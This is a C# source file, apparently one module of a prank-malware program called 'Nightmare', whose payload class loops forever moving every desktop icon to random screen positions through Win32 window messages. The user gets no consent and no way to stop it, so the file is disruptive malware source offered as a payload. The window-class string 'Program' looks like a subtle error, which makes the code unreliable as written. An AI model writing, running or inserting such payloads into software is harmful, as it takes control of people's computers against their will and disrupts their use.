using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Nightmare.Payloads
{
    public class MoveIcons // Make the desktop icons change positions in a random loop
    {
        public void MoveIcon()
        {
            while (true)
            {
                Random rand;
                rand = new Random();

                int x = Screen.PrimaryScreen.Bounds.Width;
                int y = Screen.PrimaryScreen.Bounds.Height;
                IntPtr handle = DLLImport.FindWindow("Program", null);
                handle = DLLImport.FindWindowEx(handle, IntPtr.Zero, "SHELLDLL_DefView", null);
                handle = DLLImport.FindWindowEx(handle, IntPtr.Zero, "SysListView32", null);
                DirectoryInfo dirInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
                FileInfo[] files = dirInfo.GetFiles();
                for (int num = 0; num <= files.Length + 2; num++)
                {
                    DLLImport.SendMessage(handle, DLLImport.LVM_SETITEMPOSITION, (IntPtr)num,
                        DLLImport.MakeLParam(rand.Next(x), rand.Next(y)));
                    Thread.Sleep(1);
                }
            }
        }
    }
}